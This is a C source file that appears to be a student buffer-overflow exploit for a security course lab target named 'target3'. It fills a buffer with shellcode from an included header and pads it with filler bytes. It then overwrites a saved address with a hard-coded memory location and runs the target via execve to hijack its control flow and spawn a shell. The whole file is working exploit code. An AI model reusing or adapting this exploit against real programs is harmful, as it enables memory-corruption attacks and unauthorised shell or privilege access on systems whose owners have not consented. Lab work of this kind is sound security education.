#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define hacking_memory "\x14\xfe\x21\x20\x00"  // memory of targ in bar. skips 1st 4 bytes
#define shell_size 45 // not 46
#define buffer_len 73 // program counter memory address - buffer address + 4 (for rip) + 1 (null character) - 4 (for targ)

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char hack_buffer[buffer_len];

	int i; // inputting shellcode in first 46 bytes
	for (i=0; i< shell_size; i++){
		hack_buffer[i] = shellcode[i];
	}

	for (i=45; i< buffer_len; i++){ // inputting junk for the rest of the buffer that is not null
		hack_buffer[i] = 0x03; 
	}

	memcpy(&hack_buffer[68], hacking_memory, 4);

	hack_buffer[buffer_len - 1] = '\0'; //null character


	args[0] = TARGET;
	args[1] = hack_buffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
